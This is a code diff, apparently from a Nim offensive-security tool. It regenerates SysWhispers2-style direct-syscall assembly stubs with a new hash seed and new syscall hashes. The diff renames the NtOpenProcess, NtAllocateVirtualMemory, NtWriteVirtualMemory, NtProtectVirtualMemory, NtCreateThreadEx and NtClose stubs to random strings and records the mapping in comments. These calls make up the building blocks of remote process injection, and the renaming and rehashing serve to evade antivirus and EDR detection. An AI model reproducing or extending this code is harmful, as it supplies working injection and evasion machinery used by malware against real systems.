@@ -11,7 +11,7 @@
 
 #include <windows.h>
 
-#define SW2_SEED 0xF05DCD66
+#define SW2_SEED 0xA2683AA2
 #define SW2_ROL8(v) (v << 8 | v >> 24)
 #define SW2_ROR8(v) (v >> 8 | v << 24)
 #define SW2_ROX8(v) ((SW2_SEED % 2) ? SW2_ROL8(v) : SW2_ROR8(v))
@@ -196,16 +196,23 @@ type
     Attributes*: array[2, PS_ATTRIBUTE]
   PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
 
+# NtCreateThreadEx -> tPtHogGWebVLqnhh
+# NtOpenProcess -> perAaeVqobRTNqgd
+# NtAllocateVirtualMemory -> dJQYTMYBIwAgcIUq
+# NtWriteVirtualMemory -> NVytMeJRHdbcdtmQ
+# NtProtectVirtualMemory -> ggJSHjBLWMyLbhOF
+# NtClose -> goFHDynfBnOxDxlT
 
 
-proc NtCreateThreadEx*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
+
+proc tPtHogGWebVLqnhh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x01EBBC2E0
+	mov ecx, 0x0712C8450
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -217,14 +224,14 @@ proc NtCreateThreadEx*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Object
 	ret
     """
 
-proc NtOpenProcess*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
+proc perAaeVqobRTNqgd*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x0DEA0C128
+	mov ecx, 0x051BD5020
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -236,14 +243,14 @@ proc NtOpenProcess*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAt
 	ret
     """
 
-proc NtAllocateVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+proc dJQYTMYBIwAgcIUq*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x00F92E2C4
+	mov ecx, 0x03191053D
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -255,14 +262,14 @@ proc NtAllocateVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBit
 	ret
     """
 
-proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
+proc NVytMeJRHdbcdtmQ*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x08D1D938B
+	mov ecx, 0x000196AF4
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
@@ -274,14 +281,33 @@ proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PV
 	ret
     """
 
-proc NtClose*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+proc ggJSHjBLWMyLbhOF*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
 	mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x050C8BC41
+	mov ecx, 0x01F8F7501
+	call SW2_GetSyscallNumber  
+	add rsp, 0x28
+	mov rcx, [rsp +8]          
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	syscall                    
+	ret
+    """
+
+proc goFHDynfBnOxDxlT*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+	mov [rsp +8], rcx          
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 0x28
+	mov ecx, 0x07EEA6951
 	call SW2_GetSyscallNumber  
 	add rsp, 0x28
 	mov rcx, [rsp +8]          
